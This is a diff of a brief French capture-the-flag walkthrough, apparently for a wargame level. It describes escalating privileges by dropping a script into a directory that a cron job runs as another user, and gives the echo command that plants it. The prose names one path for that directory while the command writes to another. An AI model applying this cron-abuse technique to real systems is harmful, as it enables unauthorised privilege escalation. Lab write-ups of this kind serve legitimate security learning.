@@ -1,9 +1,12 @@
 notification de nouveau mail
 ->/var/mail/level05
-on voit qu'il y a une cron task executee par flag05
-cette task execute les scripts present dans ce repertoire puis les delete : cat /usr/sbin/openarenaserver
+on voit qu'il y a une cron task qui execute `su -c "sh /usr/sbin/openarenaserver" - flag05`
+-> cat /usr/sbin/openarenaserver
+le script dans openarenaserver execute les scripts present dans ce repertoire puis les delete
 
-on va donc creer un script dans le repertoire /usr/sbin/openarenaserver qui execute `getflag` par le user flag05 et qui va l'ecrire dans /tmp/flag :
+on va donc creer un script dans le repertoire /usr/sbin/openarenaserver qui execute `getflag`
+(qui sera execute par le user flag05 puisque c'est indique dans la cron task) et qui va l'ecrire dans /tmp/flag :
+
 echo 'getflag > /tmp/flag' > /opt/openarenaserver/flag
 
-cat /tmp/flag 
+cat /tmp/flag
